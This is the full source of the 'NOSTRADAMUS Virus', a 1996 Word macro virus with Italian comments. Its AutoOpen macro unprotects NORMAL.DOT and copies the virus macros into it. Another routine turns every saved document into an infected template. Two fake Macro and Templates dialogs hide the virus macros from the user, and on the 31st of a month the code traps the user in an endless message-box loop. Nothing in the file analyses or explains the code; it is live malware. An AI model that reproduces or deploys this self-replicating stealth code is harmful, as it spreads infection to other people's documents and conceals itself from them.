   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "MacroOnFile"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "This is the ""FileSalva"" infected Macro.\r\nWill be copied into NORMAL.DOT file."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.MacroOnFile.MAIN"
   Dim Giorno
   Rem NOSTRADAMUS Virus
   Rem Macro : [MacroOnFile]
   Rem Coded by PFloriK 2/12/1996

   On Error GoTo -1: On Error GoTo Fine

   Rem Se il giorno e' il 31 si attiva, altrimenti continua l'infezione
   Giorno = WordBasic.Day(WordBasic.Now())
   If Giorno = 31 Then GoTo Attivo
   GoTo NonAttivo

   Rem In caso di attivazione viene mostrata la seguente finestra
   Attivo:
   WordBasic.MsgBox "Barbaro impero dal terzo sarai soggiogato," + Chr(13) + _
          "Gran parte d'individui della sua origine farà perire:" + Chr(13) + _
          "Per decesso senile avverrà la sua fine, il quarto colpirà" + Chr(13) _
         + "Per timore che il sangue con il sangue morte ne derivi." + Chr(13) _
         + Chr(13) + "Centuria 3°, LIX", "NOSTRADAMUS Virus", 0
   GoTo Attivo


   NonAttivo:
   Rem Converte il file .DOC in un modello di documento (.DOT)
   WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1

   Rem Copia le macro infette
   WordBasic.MacroCopy "Normal:FileModelli", WordBasic.[FileName$]() + ":FileModelli", 1
   WordBasic.MacroCopy "Normal:StrumMacro", WordBasic.[FileName$]() + ":StrumMacro", 1
   WordBasic.MacroCopy "Normal:FileSalva", WordBasic.[FileName$]() + ":MacroOnFile", 1
   WordBasic.MacroCopy "Normal:MacroOnNORMAL", WordBasic.[FileName$]() + ":AutoOpen", 1

   Rem Salva il documento
   WordBasic.FileSave

   Fine:
   End Sub


   Attribute VB_Name = "FileModelli"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Stealth Macro Number 2"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileModelli.MAIN"
   Dim Gruppo1$
   Dim Gruppo2$
   Dim CheckBox$
   Dim x
   Rem NOSTRADAMUS Virus
   Rem Macro : [FileModelli]
   Rem Coded by PFloriK 2/12/1996

   Rem Draw a MsgBox Dialog Window like the FileModelli command
   Rem but without listing active macros.....stealth!!!

   WordBasic.BeginDialog 140, 70, 575, 236, "Modelli ed aggiunte"
       WordBasic.GroupBox 8, 8, 427, 62, Gruppo1$
       WordBasic.GroupBox 8, 76, 427, 153, Gruppo2$
       WordBasic.CheckBox 20, 46, 18, 18, CheckBox$, "Identificatore" := 1
       WordBasic.OKButton 450, 10, 120, 21
       WordBasic.CancelButton 450, 35, 120, 21
       WordBasic.PushButton 450, 60, 120, 21, "&Libreria...", "Button"
       WordBasic.Text 16, 6, 146, 12, "&Modello del documento ", "TextControl1"
       WordBasic.Text 42, 50, 320, 12, "Aggiorna automaticamente gli stili" + _
       " del documento ", "TextControl2"
       WordBasic.TextBox 20, 22, 260, 18, "nomemacro"
       WordBasic.PushButton 305, 21, 120, 21, "Applica..."
       WordBasic.Text 16, 76, 176, 12, "Modelli ed aggiunte &generali", "TextControl3"
       WordBasic.Text 20, 96, 320, 12, "Gli elementi selezionati sono correntemente" + _
       " caricati", "TextControl4"
       WordBasic.PushButton 305, 110, 120, 21, "Aggi&ungi..."
       WordBasic.PushButton 305, 135, 120, 21, "Rimuovi..."
       ReDim EMPTYList__$(0)
       WordBasic.ListBox 20, 112, 274, 95, EMPTYList__$(), "List1"
       WordBasic.Text 20, 208, 320, 12, "Percorso completo:", "TextControl5"


   WordBasic.EndDialog

   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileTemplates(False)
   x = WordBasic.Dialog.FileTemplates(dlg, -1)

   End Sub


   Attribute VB_Name = "StrumMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Stealth Macro Number 1"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.StrumMacro.MAIN"
   Dim x
   Rem NOSTRADAMUS Virus
   Rem Macro : [StrumMacro]
   Rem Coded by PFloriK 2/12/1996

   Rem Draw a MsgBox Dialog Window like the Macro command
   Rem but without listing active macros.....stealth!!!

   WordBasic.BeginDialog 210, 30, 420, 300, "Macro"
       WordBasic.TextBox 6, 22, 260, 18, "nomemacro"
       WordBasic.Text 9, 6, 253, 13, "&Nome Macro:"
       WordBasic.CancelButton 280, 33, 130, 21
       WordBasic.PushButton 280, 8, 130, 21, "&Registra..."
       WordBasic.PushButton 280, 65, 130, 21, "E&segui"
       WordBasic.PushButton 280, 90, 130, 21, "Cr&ea"
       WordBasic.PushButton 280, 114, 130, 21, "Eli&mina"
       WordBasic.PushButton 280, 144, 130, 21, "&Libreria..."
       ReDim EMPTYList__$(0)
       WordBasic.ListBox 14, 40, 252, 150, EMPTYList__$(), "List1"
       WordBasic.Text 9, 192, 253, 13, "M&acro disponibili in:"
       ReDim STEALTHList__$(3)
       STEALTHList__$(0) = "Tutti i modelli attivi"
       STEALTHList__$(1) = "Normal.dot (modello generale)"
       STEALTHList__$(2) = "Comandi di Word"
       WordBasic.DropListBox 9, 205, 402, 72, STEALTHList__$(), "PROVA"
       WordBasic.Text 9, 226, 253, 13, "&Descrizione:"
       WordBasic.ListBox 9, 240, 402, 48, EMPTYList__$(), "List2"
   WordBasic.EndDialog

   Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
   x = WordBasic.Dialog.UserDialog(dlg, 2)
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "This is the Main Infection Macro.\r\nIt's loaded when you open a .DOC"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim Giorno
   Dim NORMALDir$
   Dim Nome$
   Rem NOSTRADAMUS Virus
   Rem Macro : [AutoOpen]
   Rem Coded by PFloriK 2/12/1996

   On Error GoTo -1: On Error GoTo Fine

   Rem Se il giorno e' il 31 si attiva, altrimenti continua l'infezione
   Giorno = WordBasic.Day(WordBasic.Now())
   If Giorno = 31 Then GoTo Attivo
   GoTo NonAttivo

   Rem In caso di attivazione viene mostrata la seguente finestra
   Attivo:
   WordBasic.MsgBox "Barbaro impero dal terzo sarai soggiogato," + Chr(13) + _
          "Gran parte d'individui della sua origine farà perire:" + Chr(13) + _
          "Per decesso senile avverrà la sua fine, il quarto colpirà" + Chr(13) _
         + "Per timore che il sangue con il sangue morte ne derivi." + Chr(13) _
         + Chr(13) + "Centuria 3°, LIX", "NOSTRADAMUS Virus", 0
   GoTo Attivo


   NonAttivo:
   Rem Toglie la protezione (ATTRIB -R) dal file NORMAL.DOT
   NORMALDir$ = WordBasic.[DefaultDir$](15)
   SetAttr NORMALDir$ + "\NORMAL.DOT", 0
   SetAttr NORMALDir$ + "\NORMAL.DOT", 32

   Rem Copia nei modelli le seguenti 3 macro
   Nome$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy Nome$ + ":FileModelli", "Normal:FileModelli", 1
   WordBasic.MacroCopy Nome$ + ":StrumMacro", "Normal:StrumMacro", 1
   WordBasic.MacroCopy Nome$ + ":MacroOnFile", "Normal:FileSalva", 1
   WordBasic.MacroCopy Nome$ + ":AutoOpen", "Normal:MacroOnNORMAL", 1


   Fine:
   End Sub
